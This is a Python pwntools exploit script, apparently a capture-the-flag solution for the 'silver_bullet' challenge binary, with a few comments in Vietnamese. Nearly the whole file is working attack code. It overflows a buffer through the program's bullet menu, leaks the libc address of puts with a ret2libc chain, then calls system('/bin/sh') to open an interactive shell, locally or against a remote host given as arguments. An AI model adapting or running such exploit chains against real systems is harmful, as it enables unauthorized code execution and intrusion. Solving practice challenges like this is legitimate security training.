from pwn import *
from ctypes import*

# Load glibc chạy chung với chương trình

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './silver_bullet_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
libc = ELF('./libc_32.so.6')

def create(r,des):
    r.sendlineafter(' :', b'1')
    r.sendlineafter('bullet :', des)
def pw_up(r,des):
    r.sendlineafter(' :', b'2')
    r.sendlineafter('bullet :', des)
def beat(r):
    r.sendlineafter(' :', b'3')

r = start()
#gdb.attach(r, gdbscript=gdbscript)
create(r,b'A'*0x2f)
pw_up(r,b'B')
payload = b'\xff\xff\xff'
payload += b'cccc'
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['puts'])
pw_up(r,payload)
beat(r)
r.recvuntil(b'You win !!\n')
leak = u32(r.recv(4))
libc.address = leak - libc.sym['puts']
log.info('libc_base: ' + hex(libc.address))
log.info('system: ' + hex(libc.sym['system']))
log.info('/bin/sh: ' + hex(next(libc.search(b'/bin/sh'))))
create(r,b'A'*0x2f)
pw_up(r,b'B')
payload2 = b'\xff\xff\xff'
payload2 += b'cccc'
payload2 += p32(libc.sym['system'])
payload2 += p32(elf.sym['main'])
payload2 += p32(next(libc.search(b'/bin/sh\x00')))
pw_up(r,payload2)
beat(r)

r.interactive()
